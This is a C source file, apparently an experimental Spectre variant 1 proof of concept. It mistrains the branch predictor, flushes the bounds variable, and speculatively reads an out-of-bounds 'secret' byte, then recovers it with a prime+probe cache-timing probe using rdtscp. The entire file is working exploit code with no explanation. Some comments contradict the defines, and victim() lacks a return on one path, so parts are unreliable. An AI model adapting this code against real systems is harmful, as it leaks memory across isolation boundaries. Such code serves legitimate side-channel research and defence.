#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <x86intrin.h>

/* default: 64B line size, L1-D 64KB assoc 2,
   L1-I 32KB assoc 2, L2 2MB assoc 8 */
#define LLC_SIZE (2 << 20)
#define CACHE_ASSOCIATIVITY (8)
#define BLOCK_SIZE (64)
#define SETS ((2 << 20)/64/8)
uint8_t flag;

size_t array_size = 4;
uint8_t victim_arr[200] = {1, 2, 3, 4};
// covers half of the cache lines in L1-D (32 * 2^10)
uint8_t probe_array[LLC_SIZE];
//to align the two arrays so they map in the same cache set in L2
uint8_t padding[0xFFFD0];
uint8_t evict_array[LLC_SIZE];
//uint8_t evict_array[256 * 64];
uint8_t secret;

uint8_t victim(size_t idx)
{
    if (idx < array_size) {
        return evict_array[victim_arr[idx] * 512];
    }
}

void main(){
    size_t attack_idx;
    unsigned long t[256 * CACHE_ASSOCIATIVITY];
    volatile uint8_t x;
    unsigned int junk;
    unsigned long time1, time2;
    uint8_t miss;
    unsigned long miss_time;

    //printf("Address of probe_array: %#x\n", probe_array);
    //printf("Address of evict_array: %#x\n", evict_array);
    //printf("Address of evict_array[123*64]: %#x\n", &evict_array[123*64]);
/*
    for (int i = 0; i < 256; i++){
        evict_array[i * BLOCK_SIZE] = 1;
        printf("Address of evict_array[%d * 64]: %#x\n",
 i, &evict_array[i * BLOCK_SIZE]);
    }
    _mm_mfence();
*/
    victim(0);
    victim(0);
    victim(0);
    victim(0);
    victim(0);

//    printf("start bringing probe array in cache\n");
    for (int i = 0; i < 256; i++) {
      for (int j = 0; j < CACHE_ASSOCIATIVITY; j++){
           probe_array[i * 8 * BLOCK_SIZE + (j * SETS * BLOCK_SIZE)] = 1;
         }
    }

//    for (unsigned long i = 0; i < LLC_SIZE; i++) probe_array[i] = 1;


    _mm_clflush(&array_size);

    secret = 'A'; // set the secret value, and also bring it to cache

    _mm_mfence();

    attack_idx = &secret - victim_arr;

    victim(attack_idx);

/*
    _mm_mfence();

    victim(attack_idx);

    _mm_mfence();

    victim(attack_idx);

    _mm_mfence();

    victim(attack_idx);
    */
    
    size_t training_x = 0;
    size_t malicious_x = &secret - victim_arr;
    for (int j = 29; j >= 0; j--) {
      _mm_clflush(&array_size);
      for (volatile int z = 0; z < 100; z++) {
      } /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j % 6 != 0
      * or malicious_x if j % 6 == 0 */
      /* Avoid jumps in case those tip off the branch predictor */
      /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      attack_idx = ((j % 6) - 1) & ~0xFFFF;
      /* Set x=-1 if j&6=0, else x=0 */
      attack_idx = (attack_idx | (attack_idx >> 16));
      attack_idx = training_x ^ (attack_idx & (malicious_x ^ training_x));
      /* Call the victim! */
      victim(attack_idx);
    }


    for (int i = 0; i < 256; i++) {
        int mix_i = ((i * 167) + 13) & 255;
        for (int j = CACHE_ASSOCIATIVITY - 1; j >= 0; j--){
        //probe_array[i * BLOCK_SIZE + (j * SETS * BLOCK_SIZE)] = 1;
        //printf("Address of probe_array[%d * 64 + (%d * 4096 * 64)]: %#x\n",
// i, j, &probe_array[i * BLOCK_SIZE + (j * SETS * BLOCK_SIZE)]);
            time1 = __rdtscp(&junk);
            x ^= probe_array[mix_i * 8 * BLOCK_SIZE + (j * SETS * BLOCK_SIZE)];
            time2 = __rdtscp(&junk);
            t[mix_i * CACHE_ASSOCIATIVITY + j] = time2 - time1;
         }
    }

    
   for (int i = 0; i < 256; i++) {
        miss = 0;
        for (int j = 0; j < CACHE_ASSOCIATIVITY; j++)
            if (t[i * CACHE_ASSOCIATIVITY + j] > 80) {miss = 1;
 miss_time = t[i * CACHE_ASSOCIATIVITY + j];}
        if (miss)
           //printf("%d: %d, %s\n", mix_i, miss_time, "miss");
           printf("index#%d: %ld\n", i, miss_time);
        else 
            printf("index#%d: %ld\n", i, t[i * CACHE_ASSOCIATIVITY]);
   }
   

}